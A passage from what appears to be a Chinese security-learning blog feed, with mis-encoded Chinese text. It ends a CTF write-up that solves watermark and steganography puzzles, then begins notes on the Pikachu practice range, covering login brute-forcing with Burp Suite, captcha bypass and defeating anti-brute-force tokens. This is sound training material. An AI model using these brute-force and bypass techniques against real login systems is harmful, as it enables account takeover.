punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%%å†æ¬¡å¤åˆ¶ï¼Œæ€ª</span>    <span class="token keyword">end</span><span class="token keyword">end</span>FA<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment">%%å¯¹imè¿›è¡Œå‚…é‡Œå¶å˜æ¢</span>FB<span class="token operator">=</span>FA<span class="token operator">+</span>alpha<span class="token operator">*</span><span class="token function">double</span><span class="token punctuation">(</span>mark_<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">%%å‚…é‡Œå¶+80*doubleï¼ˆmark_)</span>FAO<span class="token operator">=</span><span class="token function">ifft2</span><span class="token punctuation">(</span>FB<span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment">%%åœ¨è¿›è¡Œé€†å˜æ¢</span><span class="token function">imwrite</span><span class="token punctuation">(</span>FAO<span class="token punctuation">,</span><span class="token string">'snow.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">%%æœ€åå¯¼å‡º</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"># ä½œè€…<span class="token punctuation">(</span>Author<span class="token punctuation">)</span>ï¼šSnowywar# é“¾æ¥<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>ï¼šhttp<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>snowywar<span class="token punctuation">.</span>top<span class="token operator">/</span>wordpress<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">31</span><span class="token operator">/</span>ichunqiu<span class="token operator">-</span>write<span class="token operator">-</span>up<span class="token operator">/</span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>FAO <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'snow.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>FA <span class="token operator">=</span> <span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>FA2<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>FAO<span class="token punctuation">)</span><span class="token punctuation">;</span>G<span class="token operator">=</span><span class="token punctuation">(</span>FA2<span class="token operator">-</span>FA<span class="token punctuation">)</span><span class="token operator">/</span>alpha<span class="token punctuation">;</span>GG<span class="token operator">=</span>G<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">GG</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">GG</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">GG</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span>figure<span class="token punctuation">,</span><span class="token function">imshow</span><span class="token punctuation">(</span>GG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'extracted watermark'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imwrite</span><span class="token punctuation">(</span><span class="token function">uint8</span><span class="token punctuation">(</span>GG<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'extracted watermark.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagå°±åœ¨è§£å‡ºæ¥çš„å›¾ç‰‡é‡Œ</p><p>flag{c93fd2a3-103f-4539-9a51-ad5a6437daa1}</p><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>åé¢æ”¾äº†ä¸€ä¸ªæç¤º</p><pre class="line-numbers language-none"><code class="language-none">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32è§£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.htmlhttps://www.ncbi.nlm.nih.gov/orffinder/http://www.merrybio.com.cn/blog/coronavirus-introduction.htmlPlease notice The largest structural protein  the password is the  md5(it's gene sequence) and do not let the â€˜\nâ€™ in md5()æ³¨æ„æœ€å¤§çš„ç»“æ„è›‹ç™½ï¼Œå¯†ç æ˜¯åŸºå› åºåˆ—çš„md5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™äº†å‡ ä¸ªç½‘å€è®©æˆ‘å»é‡Œé¢æ‰¾çº¿ç´¢</p><p>ç›´æ¥ctrl+Fæ‰¾æœ€å¤§çš„ç»“æ„è›‹ç™½</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194455739.png" alt="image-20210208194455739"></p><p>æ‰¾åˆ°åŸºå› ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208211243378.png" alt="image-20210208211243378"></p><p>æ¥ç€å»é‚£ä¸ªæ”¿åºœç½‘ç«™æ‰¾åˆ°å®ƒçš„å…¨åŸºå› ç»„åºåˆ—ï¼ˆMN908947ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194508194.png" alt="image-20210208194508194"></p><p>æ ¹æ®æç¤ºï¼Œè®¡ç®—å®ƒä»¬çš„md5</p><p>md5:98eb1b1760bcc837934c8695a1cee923</p><p>æ‹¿MP3stego è§£å¼€ cov.mp3</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">MP3StegoDecode.exe -X -P 98eb1b1760bcc837934c8695a1cee923 cov.mp3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ… realflag.zip  å¯†ç ä¸º 2019-nCoV</p><p>è§£å‹ä¹‹åæœ‰æç¤º2å’Œä¸€å¼ å›¾ç‰‡</p><pre class="line-numbers language-none"><code class="language-none">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªbase16è½¬ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">you must pay attention to N protein ,How do that get into the viral capsid? æ ¸è¡£å£³è›‹ç™½ï¼ˆnucleoproteinï¼ŒNï¼‰ï¼Œå®ƒå¦‚ä½•è¿›å…¥ç—…æ¯’è¡£å£³å†…ï¼Ÿdo you know steghide? the password is encrypt by VigenÃ¨re Cipher the screct key is The top 20 characters with the most occurrences are counted+COMBAT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å›åˆ°é‚£ä¸ªç½‘ç«™</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208211301543.png" alt="image-20210208211301543"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194530587.png" alt="image-20210208194530587"></p><p>æŠŠè¿™ä¸‰ä¸ªè›‹ç™½æ”¾åˆ°ä¸€èµ·</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194550278.png" alt="image-20210208194550278"></p><p>æ ¹æ®hint2,æ‰¾åˆ°è¿™ä¸ªåŸºå› ç»„åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„20ä¸ªå­—ç¬¦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL DDFSKQLQQSMSSADSTQA MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR IGNYKLNTDHSSSSDNIALLVQ MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS QLDEEQPMEID"""</span> s <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> d <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>     <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>         <span class="token keyword">else</span><span class="token punctuation">:</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>              l <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>             r<span class="token operator">=</span><span class="token string">''</span>             <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>                 r <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                 <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§£å‡ºæ¥åæ˜¯è¿™ä¸ªï¼š<code>LGASTRIQKNDPFEVYMWHC</code></p><p>æ ¹æ®æç¤ºæœ€åè¿˜è¦+COMBAT</p><p>ç”¨ SilentEye å¯¹ pass.wav è§£å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194612346.png" alt="image-20210208194612346"></p><p>å¾—åˆ° password <code>priebeijoarkjpxmdkucxwdus</code></p><p>æç¤ºè¯´æ˜¯ç»´å‰å°¼äºšåŠ å¯†</p><p>æ‹¿<code>LGASTRIQKNDPFEVYMWHC</code>è§£å¯†åˆšåˆšè§£å‡ºæ¥çš„password</p><p>final_password=<code>eliminatenovelcoronavirts</code></p><p>æœ€åç”¨è¿™ä¸ªå¯†ç å» steghide è§£å›¾ç‰‡å°±å¯ä»¥æ‹¿åˆ°flagäº†ğŸ˜­</p><p>flag{we_will_over_come_SARS-COV}</p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/#F">å‚è€ƒé“¾æ¥</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachué¶åœºå­¦ä¹ </title>
      <link href="2021/ba-chang-xue-xi/pikachu/"/>
      <url>2021/ba-chang-xue-xi/pikachu/</url>
      
        <content type="html"><![CDATA[<h2 id="Burte-Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰"><a href="#Burte-Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰" class="headerlink" title="Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰"></a>Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰</h2><blockquote><p>â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»å…·æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚        </p><p>ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š</p><p>1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›<br>2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›<br>3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›<br>4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›<br>    â€¦ç­‰ç­‰ã€‚</p></blockquote><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>æ—¢ç„¶æ˜¯çˆ†ç ´ï¼Œæ¯”è¾ƒå¥½ç”¨çš„å·¥å…·å°±æ˜¯BurpSuiteäº†</p><p>è‡ªå·±è™½è¯´ä¼šç”¨ä¸€ç‚¹ï¼Œä½†æ²¡æœ‰ç³»ç»Ÿçš„å»å­¦è¿‡å®ƒçš„çˆ†ç ´æ¨¡å—ï¼Œç°åœ¨æ­£å¥½å¥½å¥½å­¦ä¸€ä¸‹</p><p>åœ¨BurpSuiteä¸­ï¼Œä¸€å…±æœ‰å››ç§çˆ†ç ´æ¨¡å¼å¯ä¾›é€‰æ‹©ï¼Œå®ƒä»¬çš„ç¿»è¯‘ä¹ŸæŒºå¥½ç©çš„</p><table><thead><tr><th>Module</th><th>Feature</th></tr></thead><tbody><tr><td>Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰</td><td>é¡¾åæ€ä¹‰ï¼Œåªèƒ½åƒç‹™å‡»æ‰‹ä¸€æ ·ä¸€æªä¸€æªæ‰“ï¼Œä¸€èˆ¬åªè®¾ç½®ä¸€ä¸ªçˆ†ç ´ç‚¹</td></tr><tr><td>Battering ramï¼ˆæ”»åŸé”¤ï¼‰</td><td>å’Œç‹™å‡»æ‰‹å·®ä¸å¤šï¼Œä½†å¯ä»¥äºŒè¿å‘ï¼Œä¸€ä¸ªpayloadåŒæ—¶æ‰“ä¸¤ä¸ªçˆ†ç ´ç‚¹</td></tr><tr><td>Pitchforkï¼ˆå‰å­ï¼‰</td><td>æ ¹æ®è®¾ç½®çš„å˜é‡çš„ä¸ªæ•°æ¥é€‰æ‹©payload(&gt;1)ï¼Œå¦‚æœä¸¤ä¸ªpayloadæ•°é‡ä¸ä¸€æ ·ä¸€èˆ¬å–å®ƒä»¬çš„äº¤é›†</td></tr><tr><td>Cluster bombï¼ˆé›†æŸç‚¸å¼¹ï¼‰</td><td>å’Œå‰å­ä¸€æ ·ï¼Œpayload&gt;1,å¹¶å¯¹payloadå–ç¬›å¡å°”ç§¯å»çˆ†ç ´</td></tr></tbody></table><p>ä»ç½‘ä¸Šæ‰¾æ¥å‡ å¼ å›¾ä»¥ä¾¿åŠ æ·±ç†è§£</p><p>Sniper</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209115444395.png"></p><p>Battering ram</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209115552506.png"></p><p>Pitchfork</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209115634697.png"></p><p>Cluster bomb</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209115711954.png"></p><h3 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p>å¾ˆç®€å•ï¼ŒæŠ“åŒ…ä½¿ç”¨cluster bombæ¨¡å¼çˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209120610439.png"></p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h3><p>ä¸¢åˆ°Repeateré‡Œå»è¯•è¯•ï¼Œå‘ç°ç™»å½•è¿‡åçš„éªŒè¯ç åœ¨ä¸€æ®µæ—¶é—´å†…ä¸ä¼šè¿‡æœŸï¼Œä¾ç„¶å¯ä»¥åƒä¸Šæ¬¡é‚£æ ·ç›´æ¥çˆ†ç ´</p><p>åœ¨è¾“å…¥ä¸€æ¬¡éªŒè¯ç æŠ“åŒ…åå°±ä¸€ç›´å¯ä»¥ç”¨åŸæ¥çš„éªŒè¯ç çˆ†ç ´ï¼ŒéªŒè¯ç ç›¸å½“äºæ‘†è®¾</p><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·å­å‘¢ï¼ŸæŸ¥ç•¥èµ„æ–™å‘ç°æ˜¯ç”±äºç™»å½•ä¹‹åæœåŠ¡ç«¯sessionå€¼æ²¡æœ‰æ›´æ–°é€ æˆçš„</p><p>å‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/1736946">https://cloud.tencent.com/developer/article/1736946</a></p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h3><p>å®¢æˆ·ç«¯çš„éªŒè¯ç ï¼Œå…ˆçœ‹çœ‹jsä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209151720123.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209151344153.png"></p><p>ç›´æ¥åˆ äº†ï¼Œæ¥ä¸‹æ¥å°±å’Œå‰é¢ä¸€æ ·äº†</p><h3 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´"></a>tokené˜²çˆ†ç ´</h3><p><strong>æ¦‚è¿°</strong></p><blockquote><p>tokençš„æ„æ€æ˜¯â€œä»¤ç‰Œâ€ï¼Œæ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä½œä¸ºå®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚çš„ä¸€ä¸ªæ ‡è¯†ã€‚</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªtokenå¹¶å°†æ­¤tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä»¥åå®¢æˆ·ç«¯åªéœ€å¸¦ä¸Šè¿™ä¸ªtokenå‰æ¥è¯·æ±‚æ•°æ®å³å¯ï¼Œæ— éœ€å†æ¬¡å¸¦ä¸Šç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>ç®€å•tokençš„ç»„æˆï¼›uid(ç”¨æˆ·å”¯ä¸€çš„èº«ä»½æ ‡è¯†)ã€time(å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³)ã€signï¼ˆç­¾åï¼Œtokençš„å‰å‡ ä½ä»¥å“ˆå¸Œç®—æ³•å‹ç¼©æˆçš„ä¸€å®šé•¿åº¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ä¸ºé˜²æ­¢tokenæ³„éœ²ï¼‰ã€‚</p></blockquote><p>ä¸ç®¡å®ƒï¼Œå…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209152533123.png"></p><p>éšä¾¿è¯•ä¸€ä¸‹å‘ç°è¿™ä¸ªtokenæ¯æ¬¡éƒ½ä¼šåˆ·æ–°ï¼Œæ‰€ä»¥åªèƒ½èˆæ‰ä¸€ä¸ªå˜é‡äº†ï¼Œå› ä¸ºçŸ¥é“adminæ˜¯å…¶ä¸­ä¸€ä¸ªè´¦å·ï¼Œæ‰€ä»¥å»æ‰username</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209153215122.png"></p><p>è®¾ç½®å¥½çˆ†ç ´ç‚¹åï¼Œåœ¨optionä¸­æ·»åŠ æ­£åˆ™æå–</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209154209517.png"></p><p>æ‰¾åˆ°è¦çˆ†ç ´çš„tokenå°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209154427227.png"></p><p>ç¬¬äºŒä¸ªçˆ†ç ´ç‚¹çš„è®¾ç½®ä¸ºé€’å½’æœç´¢ï¼ŒæŠŠæ‰¾åˆ°çš„tokenè´´åˆ°ä¸‹é¢å»</p><p><img 